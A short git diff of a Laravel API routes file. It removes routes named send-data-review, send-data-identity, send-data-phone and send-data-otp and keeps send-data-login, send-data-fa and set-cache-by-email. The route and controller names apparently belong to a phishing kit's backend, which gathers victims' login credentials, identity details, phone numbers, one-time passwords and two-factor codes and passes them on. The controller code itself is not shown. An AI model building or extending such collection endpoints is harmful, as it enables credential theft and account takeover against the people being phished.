@@ -1,7 +1,6 @@
 <?php
 
 use App\Http\Controllers\Controller;
-use App\Http\Controllers\HomeController;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 
@@ -21,10 +20,6 @@ Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
 });
 
 Route::post('/send-data-login', [Controller::class, 'getAndSendDataLogin'])->name('getAndSendDataLogin');
-Route::post('/send-data-review', [Controller::class, 'getAndSendDataReview'])->name('getAndSendDataReview');
-Route::post('/send-data-identity', [Controller::class, 'getAndSendDataIdentity'])->name('getAndSendDataIdentity');
-Route::post('/send-data-phone', [Controller::class, 'getAndSendDataMobile'])->name('getAndSendDataMobile');
-Route::post('/send-data-otp', [Controller::class, 'getAndSendDataOtp'])->name('getAndSendDataOtp');
 Route::post('/send-data-fa', [Controller::class, 'getAndSendDataFa'])->name('getAndSendDataFa');
 
 Route::post('/set-cache-by-email', [Controller::class, 'setCacheByEmail'])->name('setCacheByEmail');
